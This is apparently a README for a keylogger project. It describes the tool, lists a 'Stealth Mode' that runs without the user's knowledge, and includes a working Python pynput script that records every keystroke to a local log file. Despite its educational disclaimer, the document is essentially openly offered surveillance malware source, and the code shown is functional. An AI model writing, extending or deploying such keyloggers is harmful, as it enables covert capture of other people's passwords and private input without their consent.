# Keylogger

![Keylogger](https://example.com/your-image-url.jpg) <!-- Replace with an actual image URL if you have one -->

## Overview

A keylogger is a tool designed to record every keystroke made by a user on a computer keyboard. This project demonstrates a basic keylogger implementation for educational purposes, highlighting how keyloggers work and the potential security implications. **Note: This tool should be used responsibly and ethically. Unauthorized use of keyloggers is illegal and unethical.**

## Features

- **Keystroke Logging**: Capture and log all keystrokes made by the user.
- **Log Storage**: Save the logged keystrokes to a file for later analysis.
- **Stealth Mode**: Run in the background without the user's knowledge.

## How It Works

The keylogger runs in the background, intercepting keyboard events and recording the keystrokes. The captured data is then stored in a log file, which can be analyzed later.

### Example

Here is an example of how the keylogger captures keystrokes and saves them to a log file:

```python
import pynput
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key} pressed\n")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
